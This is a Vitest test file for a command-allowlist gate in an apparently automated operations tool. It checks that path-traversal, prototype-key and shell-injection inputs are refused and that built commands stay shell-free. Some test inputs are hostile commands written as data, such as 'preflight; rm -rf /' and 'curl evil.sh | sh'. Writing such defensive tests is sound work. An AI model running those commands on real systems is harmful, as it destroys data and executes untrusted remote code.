import { describe, expect, it } from "vitest";
import { OPS_ACTIONS } from "@/lib/ops";
import { ROUTINE_IDS } from "@/lib/schemas";
import { buildOpsSteps, resolveOpsAction } from "./ops";

const ALLOWED_BINARIES = ["/bin/bash", "/bin/launchctl"];
// Anything that would matter if a string ever reached a shell.
const SHELL_METACHARS = /[;&|`$(){}<>*?!\\"'\n\r]/;

describe("resolveOpsAction — allowlist gate", () => {
  it("resolves known action IDs", () => {
    expect(resolveOpsAction("preflight")?.id).toBe("preflight");
    expect(resolveOpsAction("kill-switch")?.id).toBe("kill-switch");
    expect(resolveOpsAction("routine:pre-market-research")?.id).toBe(
      "routine:pre-market-research",
    );
  });

  it("refuses a NON-allowlisted action ID", () => {
    expect(resolveOpsAction("rm-rf")).toBeNull();
    expect(resolveOpsAction("restore")).toBeNull();
    expect(resolveOpsAction("new-branch-commit")).toBeNull();
    expect(resolveOpsAction("")).toBeNull();
    expect(resolveOpsAction("routine:bogus")).toBeNull();
  });

  it("refuses a path / path-traversal injection passed as the action ID", () => {
    expect(resolveOpsAction("scripts/preflight.sh")).toBeNull();
    expect(resolveOpsAction("../preflight")).toBeNull();
    expect(resolveOpsAction("/etc/passwd")).toBeNull();
    expect(resolveOpsAction("../../scripts/kill-switch.sh")).toBeNull();
    expect(resolveOpsAction("routine:../../../etc/passwd")).toBeNull();
    expect(resolveOpsAction("preflight; rm -rf /")).toBeNull();
    expect(resolveOpsAction("preflight && curl evil.sh | sh")).toBeNull();
  });

  it("refuses prototype-chain keys and non-string IDs", () => {
    expect(resolveOpsAction("__proto__")).toBeNull();
    expect(resolveOpsAction("constructor")).toBeNull();
    expect(resolveOpsAction("toString")).toBeNull();
    expect(resolveOpsAction(undefined)).toBeNull();
    expect(resolveOpsAction(null)).toBeNull();
    expect(resolveOpsAction(42)).toBeNull();
    expect(resolveOpsAction({ id: "preflight" })).toBeNull();
  });
});

describe("buildOpsSteps — fixed, shell-free commands", () => {
  it("maps each allowlisted ID to a fixed binary + fixed args", async () => {
    const pf = await buildOpsSteps("preflight");
    expect(pf).toHaveLength(1);
    expect(pf[0].command).toBe("/bin/bash");
    expect(pf[0].args).toHaveLength(1);
    expect(pf[0].args[0]).toMatch(/\/scripts\/preflight\.sh$/);

    const shake = await buildOpsSteps("preflight-shakedown");
    expect(shake[0].args[0]).toMatch(/\/scripts\/preflight\.sh$/);
    expect(shake[0].args[1]).toBe("--shakedown");

    const dry = await buildOpsSteps("backup-dry-run");
    expect(dry[0].args).toEqual([
      expect.stringMatching(/\/scripts\/backup\.sh$/),
      "--dry-run",
    ]);
  });

  it("maps each routine to run-routine.sh with the exact routine ID", async () => {
    for (const id of ROUTINE_IDS) {
      const steps = await buildOpsSteps(`routine:${id}`);
      expect(steps).toHaveLength(1);
      expect(steps[0].command).toBe("/bin/bash");
      expect(steps[0].args[0]).toMatch(/\/scripts\/run-routine\.sh$/);
      expect(steps[0].args[1]).toBe(id);
      expect(steps[0].args).toHaveLength(2);
    }
  });

  it("THROWS rather than building a command for a non-allowlisted ID", async () => {
    await expect(buildOpsSteps("scripts/preflight.sh")).rejects.toThrow(/refused/);
    await expect(buildOpsSteps("../preflight")).rejects.toThrow(/refused/);
    await expect(buildOpsSteps("routine:../../etc/passwd")).rejects.toThrow(/refused/);
    await expect(buildOpsSteps("routine:bogus")).rejects.toThrow(/refused/);
    await expect(buildOpsSteps("rm-rf")).rejects.toThrow(/refused/);
  });

  it("every allowlisted action builds only allowed binaries with clean args", async () => {
    for (const action of OPS_ACTIONS) {
      const steps = await buildOpsSteps(action.id);
      for (const step of steps) {
        expect(ALLOWED_BINARIES).toContain(step.command);
        for (const arg of step.args) {
          expect(arg).not.toMatch(SHELL_METACHARS);
        }
      }
    }
  });
});

describe("allowlist invariants — no escape hatches", () => {
  it("never references restore.sh or dev/git scripts", async () => {
    for (const action of OPS_ACTIONS) {
      const steps = await buildOpsSteps(action.id);
      const joined = steps.map((s) => [s.command, ...s.args].join(" ")).join(" ");
      expect(joined).not.toMatch(/restore\.sh/);
      expect(joined).not.toMatch(/new-branch-commit\.sh/);
      expect(joined).not.toMatch(/revoke-order-permission/);
    }
  });

  it("never references settings.json (cannot open the harness gate)", async () => {
    for (const action of OPS_ACTIONS) {
      const steps = await buildOpsSteps(action.id);
      const joined = steps.map((s) => [s.command, ...s.args].join(" ")).join(" ");
      expect(joined).not.toMatch(/settings\.json/);
    }
  });

  it("includes the always-safe kill switch", () => {
    expect(OPS_ACTIONS.some((a) => a.id === "kill-switch")).toBe(true);
  });
});
